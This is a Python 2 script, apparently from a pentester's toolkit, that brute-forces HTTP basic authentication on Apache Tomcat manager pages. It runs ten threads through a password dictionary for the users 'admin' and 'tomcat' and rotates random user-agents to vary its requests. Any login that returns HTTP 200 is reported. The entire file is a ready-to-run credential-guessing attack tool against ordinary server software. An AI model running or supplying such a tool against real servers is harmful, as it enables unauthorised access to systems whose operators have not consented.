#!/usr/bin/env python
# encoding:utf8
import requests
import Queue
from threading import Thread
from random import choice
import sys
import time

__author__ = 'whois'
__date__ = '2016/5/24'

user_list = ['admin','tomcat']
col_ok    = '\033[95m'
col_end   = '\033[0m'  

agent_file = "/Pentest/Scripts/PySec/pytxt/user-agents.txt"
default_pass = '/Pentest/PassList/Passwords/tomcat.txt'
tomcat7_before_pass = '/Pentest/PassList/Passwords/fuckserver.txt'

with open(agent_file,'r') as f:
    agents_list = [ line.rstrip() for line in f.readlines()]

banner = """
 ____                    _   _     
|  _ \ _   _  __ _ _   _| |_| |__  
| |_) | | | |/ _` | | | | __| '_ \ 
|  __/| |_| | (_| | |_| | |_| | | |
|_|    \__, |\__,_|\__,_|\__|_| |_|
       |___/                       
"""

if len(sys.argv) < 2:
    print banner 
    print "[*] {0} [url]  <dict_file>".format(sys.argv[0])
    print "[*] Default Password is tomcat7.txt."
    print "[*] Tomcat before 7 using big dict."
    print "[*] python pyauth.py http://xxx.com/manager/html password.txt"
    exit(0)

url = sys.argv[1]

dict_file = sys.argv[2] if len(sys.argv) == 3 else default_pass

queue = Queue.Queue()

with open(dict_file,'r') as f:
    [ queue.put(line.rstrip()) for line in f.readlines() ]

def do(password):
    HEADERS = {'user-agent':choice(agents_list)}
    for user in user_list:
        auth = (user, password)
        try:
            r = requests.get(url, auth=auth, headers=HEADERS, timeout=8)
        except:
            print "[-] url is error!"
            exit(1)
        sys.stdout.write('\r{0} '.format(password))
        sys.stdout.flush()
        if r.status_code == 200:
            print col_ok + "[+] auth --> {0}:{1}".format(user,password) + col_end
            exit(0)

def scan():
    while not queue.empty():
        do(queue.get())

def main():
    threads_list = []
    threads = 10

    for i in xrange(threads):
        t = Thread(target=scan)
        t.start()
        threads_list.append(t)

    for i in range(threads):
        threads_list[i].join()

if __name__ == '__main__':
    main()
